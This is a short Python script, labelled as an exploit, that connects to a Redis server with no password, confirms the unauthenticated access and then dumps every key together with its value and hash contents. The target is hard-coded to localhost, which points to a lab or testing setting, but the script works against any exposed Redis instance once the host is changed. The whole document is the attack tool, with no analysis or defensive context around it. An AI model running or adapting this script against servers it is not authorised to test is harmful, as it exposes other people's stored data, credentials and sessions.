import redis

TARGET = "localhost"
PORT = 6379

def exploit_redis():
    print(f"[*] Testing Redis Unauthenticated Access on {TARGET}:{PORT}...")
    try:
        r = redis.Redis(host=TARGET, port=PORT, socket_connect_timeout=5)
        if r.ping():
            print("[+] Success! Redis is accessible without authentication.")
            
            print("[*] Enumerating Keys:")
            keys = r.keys('*')
            for key in keys:
                k_str = key.decode()
                val = r.get(key)
                if val:
                    print(f"    - {k_str}: {val.decode()}")
                else:
                    # Might be a hash or list
                    type_ = r.type(key).decode()
                    print(f"    - {k_str} ({type_})")
                    if type_ == 'hash':
                        print(f"      Data: {r.hgetall(key)}")
        else:
            print("[-] Redis ping failed.")
            
    except Exception as e:
        print(f"[-] Redis exploit failed: {e}")

if __name__ == "__main__":
    exploit_redis()
